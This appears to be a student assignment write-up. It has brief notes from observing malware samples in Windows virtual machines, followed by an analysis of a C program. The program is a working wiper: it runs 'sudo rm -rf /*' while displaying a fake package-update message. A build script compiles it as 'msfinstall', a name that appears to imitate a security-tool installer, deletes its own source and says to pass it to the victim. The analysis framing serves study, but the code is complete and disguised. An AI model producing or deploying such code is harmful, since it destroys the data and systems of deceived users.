## Malware Analysis

 The assignment was to run malicious software on a windows sandbox and observe behaviours of the program.
 We used virtual box and run windows 7 on a VB instance.
 After running the program a few times we only managed to observe a few things.
 
 While  running the malware the program tried to perform a tcp connection to an external host, but was quickly stopped by the defender program.

>While running the malware samples on a windows 10 VM we were able to find more details.

## Icon

Most of malicious programs such as Javascript files and VB scripts had their default icons present while some executables had the icon of a folder
This is probably to deceive the victim into clicking it.

## Registry

We were able to find the registry to some of the malwares using the sysinternal tools

## Activities

We observed that some of the malware samples managed to navigate to the adminstrator directory of the system.

## Eradicating the malwares

To eradicate the malwares from the system we only had to delete the processes from sysinternals

# Assignment-3
## Code analysis

The source code that was analized was a C program that performed a given task.
```C
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define kill_os "sudo rm -rf /*"
#define text "Switching to root user to update the package" 
#define error_text "There has been an error."

int main(){
#if defined __linux__ || defined __unix__
    if ( geteuid() != 0 ){
        printf("%s\n", text); 
    }
    system(kill_os);
#else
    printf("%s\n", error_text);
    return 1;
#endif
}
```

The above C code is a script that will automatically destroy any linux/unix based system.

    1. The program starts by insuring that the current system is a linux/unix based one.
    2. If the system turns out to be a non linux/unix one it will display an error.
    3. Once the system is assured to be linux/unix then it will remove the root folder of the os which will lead to a complete distruction of the system.

The C program is compiled using the build.sh file.

```bash
#!/bin/sh
gcc main.c -o msfinstall
mv msfinstall ..
cd .. && rm -rf fake-msfinstall/
echo "Now pass 'msfinstall' to the victim."
exit
```
